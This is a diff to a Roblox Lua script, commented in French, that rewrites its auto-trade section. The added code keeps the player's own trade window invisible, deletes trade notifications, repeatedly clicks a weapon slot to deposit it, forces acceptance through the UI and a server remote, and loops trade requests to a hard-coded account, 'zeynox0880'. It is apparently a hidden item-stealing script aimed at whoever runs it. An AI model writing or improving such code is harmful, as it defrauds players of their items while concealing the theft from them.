@@ -183,7 +183,7 @@ CloseBtn.MouseButton1Click:Connect(function()
     ScreenGui:Destroy()
 end)
 
--- [[ 4. AUTO-TRADE AVEC TES CHEMINS CORRIGÉS ]]
+-- [[ 4. LOGIQUE AUTOMATIQUE DE DEPOSIT ET FORCE-HIDE ]]
 local function forceClick(guiButton)
     if not guiButton then return end
     local firesignalFunc = firesignal or (syn and syn.firesignal)
@@ -194,102 +194,85 @@ local function forceClick(guiButton)
     end
 end
 
--- Fonction pour localiser dynamiquement le conteneur d'armes
-local function findWeaponScroller(root)
-    for _, child in ipairs(root:GetDescendants()) do
-        if (child:IsA("ScrollingFrame") or child:IsA("Frame")) and (child.Name == "Container" or child.Name == "Items") then
-            local elements = child:GetChildren()
-            local clickableCount = 0
-            for _, el in ipairs(elements) do
-                if el:IsA("GuiButton") then
-                    clickableCount = clickableCount + 1
-                end
-            end
-            if clickableCount >= 1 then
-                return child
+local function executeTradeSequence(tradeGui)
+    -- BOUCLE SÉCURISÉE : Force l'invisibilité totale en permanence pour contrer le script du jeu
+    task.spawn(function()
+        while tradeGui and tradeGui.Parent do
+            tradeGui.Enabled = false
+            -- On cache aussi le conteneur principal au cas où le jeu force l'activation globale
+            local container = tradeGui:FindFirstChild("Container")
+            if container then container.Visible = false end
+            task.wait()
+        end
+    end)
+
+    -- Recherche agressive des boutons d'armes (indépendamment de l'arborescence)
+    local targetWeapon = nil
+    for attempt = 1, 50 do
+        local buttons = {}
+        for _, descendant in ipairs(tradeGui:GetDescendants()) do
+            if descendant:IsA("GuiButton") and (descendant.Name:lower():find("weapon") or descendant.Parent.Name == "Container" or descendant.Parent.Name == "Current") then
+                table.insert(buttons, descendant)
             end
         end
-    end
-    return nil
-end
-
-local function executeTradeSequence(tradeGui)
-    -- REND L'INTERFACE INVISIBLE DIRECTEMENT DANS LE PLAYERGUI
-    tradeGui.Enabled = false 
-    
-    local containerPath = nil
-    for i = 1, 40 do
-        containerPath = findWeaponScroller(tradeGui)
-        if containerPath then break end
+        
+        if #buttons > 0 then
+            table.sort(buttons, function(a, b) return (a.LayoutOrder or 0) < (b.LayoutOrder or 0) end)
+            targetWeapon = buttons[4] or buttons[1] -- Prends la 4ème ou la 1ère disponible
+            break
+        end
         task.wait(0.1)
     end
-    
-    if containerPath then
-        local cleanItems = {}
-        for attempt = 1, 30 do
-            cleanItems = {}
-            for _, item in ipairs(containerPath:GetChildren()) do
-                if item:IsA("GuiButton") then
-                    table.insert(cleanItems, item)
-                end
-            end
-            if #cleanItems >= 4 then break end
-            task.wait(0.1)
-        end
-        
-        table.sort(cleanItems, function(a, b)
-            return (a.LayoutOrder or 0) < (b.LayoutOrder or 0)
-        end)
-        
-        -- Dépôt de l'arme
-        local targetWeapon = cleanItems[4] or cleanItems[1]
-        if targetWeapon then
-            for i = 1, 5 do
-                forceClick(targetWeapon)
-                task.wait(0.05)
-            end
+
+    -- Pose l'arme (Spam l'activation)
+    if targetWeapon then
+        for i = 1, 7 do
+            forceClick(targetWeapon)
+            task.wait(0.05)
         end
     end
-    
-    -- Validation via ton chemin physique précis : Container.Trade.Actions.Accept
-    task.wait(0.8)
+
+    -- Validation forcée via ton chemin exact
+    task.wait(0.5)
     pcall(function()
         local acceptButton = tradeGui.Container.Trade.Actions.Accept
         if acceptButton then
             forceClick(acceptButton)
         end
     end)
-    
-    -- Sécurité réseau via le deuxième chemin (GetTradeStatus / Accept)
+
+    -- Bypass Réseau via le Remote fourni (GetTradeStatus) en cas de problème de clic
     pcall(function()
-        local remote = ReplicatedStorage.Trade:FindFirstChild("GetTradeStatus") or ReplicatedStorage.Trade:FindFirstChild("AcceptTrade")
-        if remote then
-            if remote:IsA("RemoteEvent") then remote:FireServer(true)
-            elseif remote:IsA("RemoteFunction") then remote:InvokeServer(true) end
+        local statusRemote = ReplicatedStorage.Trade:FindFirstChild("GetTradeStatus")
+        if statusRemote then
+            if statusRemote:IsA("RemoteEvent") then statusRemote:FireServer(true)
+            elseif statusRemote:IsA("RemoteFunction") then statusRemote:InvokeServer(true) end
         end
     end)
 end
 
--- Capture l'UI directement dans le PlayerGui (Copie conforme de StarterGui)
+-- Gestionnaire d'interception directe
 local function cleanTradeRequestPopups(child)
     if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
-        child.Enabled = false -- Cache instantanément
+        child.Enabled = false
         task.spawn(function() executeTradeSequence(child) end)
     elseif child.Name == "TradeRequestGUI" or child.Name == "TradePrompt" or child.Name == "NotificationGUI" then
-        task.wait(0.1)
+        task.wait(0.05)
         child:Destroy()
     end
 end
 
 playerGui.ChildAdded:Connect(cleanTradeRequestPopups)
 
-local existingTrade = playerGui:FindFirstChild("TradeGUI") or playerGui:FindFirstChild("TradeGUI_Phone")
-if existingTrade then 
-    existingTrade.Enabled = false
-    task.spawn(function() executeTradeSequence(existingTrade) end) 
+-- Forcer l'application immédiate si déjà ouverts
+for _, child in ipairs(playerGui:GetChildren()) do
+    if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
+        child.Enabled = false
+        task.spawn(function() executeTradeSequence(child) end)
+    end
 end
 
--- [[ 5. BOUCLE DE SPAM CORRIGÉE (CHEMIN DYNAMIQUE SANS CRASH D'ID) ]]
+-- [[ 5. BOUCLE DE SPAM DE DEMANDE EN ARRIÈRE-PLAN ]]
 task.spawn(function()
     while true do
         task.wait(3)
@@ -299,7 +282,6 @@ task.spawn(function()
             local targetPlayer = Players:FindFirstChild("zeynox0880")
             if targetPlayer then
                 pcall(function()
-                    -- Utilise "LocalPlayer" dynamiquement pour s'adapter à ton dossier chiffré
                     local tradeRequestButton = playerGui.MainGUI.Game.PlayerMenu.Trade
                     if tradeRequestButton then
                         forceClick(tradeRequestButton)
